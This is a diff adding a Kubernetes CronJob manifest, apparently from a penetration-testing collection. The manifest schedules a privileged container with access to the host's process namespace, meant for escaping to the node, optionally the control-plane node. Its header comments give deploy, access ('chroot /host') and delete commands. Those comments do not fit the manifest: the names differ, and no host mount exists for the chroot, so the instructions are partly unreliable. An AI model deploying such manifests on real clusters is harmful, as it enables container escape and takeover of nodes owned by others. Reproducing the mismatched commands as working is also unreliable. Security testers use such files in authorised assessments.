@@ -1,0 +1,29 @@
+###########################################################
+## Deploy: kubectl apply -f priv-and-hostpid-exec.yaml 
+## Access: kubectl exec -it priv-and-hostpid-exec -- chroot /host
+## Remove: kubectl delete priv-and-hostpid-exec
+###########################################################
+
+apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: priv-and-hostpid-exec-cronjob
+  labels:
+    app: pentest
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          hostPID: true
+          containers:
+          - name: priv-and-hostpid-exec-cronjob
+            image: ubuntu
+            securityContext:
+              privileged: true
+            command: [ "/bin/sh", "-c", "--" ]
+            args: [ "while true; do sleep 30; done;" ]
+          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+          restartPolicy: OnFailure
